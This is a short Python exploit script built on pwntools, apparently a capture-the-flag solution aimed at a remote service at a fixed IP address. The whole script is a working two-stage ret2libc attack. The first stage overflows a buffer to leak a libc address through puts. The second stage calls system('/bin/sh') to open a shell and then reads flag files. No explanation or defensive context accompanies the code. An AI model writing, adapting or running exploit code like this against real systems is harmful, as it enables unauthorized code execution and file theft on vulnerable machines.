from pwn import *

context.arch = 'i386'
context.log_level = 'info'

# Binary addresses (No PIE)
puts_plt = 0x8049050
read_got = 0x804c00c
vul_addr = 0x8049205
offset_to_ret = 0x4c + 4 + 4  # 84

# libc offsets (libc6-i386_2.31-0ubuntu9)
read_off  = 0xf0790
system_off = 0x41360
binsh_off  = 0x18c363

p = remote('39.96.193.120', 10002)
p.recvuntil(b'ground.\n')

# Stage 1: Leak libc via puts(read@got), return to vul
payload1 = b'A' * offset_to_ret
payload1 += p32(puts_plt)
payload1 += p32(vul_addr)
payload1 += p32(read_got)
p.send(payload1)

leaked = p.recvuntil(b'\n', drop=True)
read_addr = u32(leaked[:4])
libc_base = read_addr - read_off
system_addr = libc_base + system_off
binsh_addr = libc_base + binsh_off
log.info(f'libc base: {hex(libc_base)}')
log.info(f'system: {hex(system_addr)}')
log.info(f'/bin/sh: {hex(binsh_addr)}')

# Stage 2: ret2libc system("/bin/sh")
payload2 = b'B' * offset_to_ret
payload2 += p32(system_addr)
payload2 += p32(0xdeadbeef)
payload2 += p32(binsh_addr)
p.send(payload2)

sleep(0.3)
p.sendline(b'cat /flag*')
print(p.recvall(timeout=3).decode(errors='replace'))
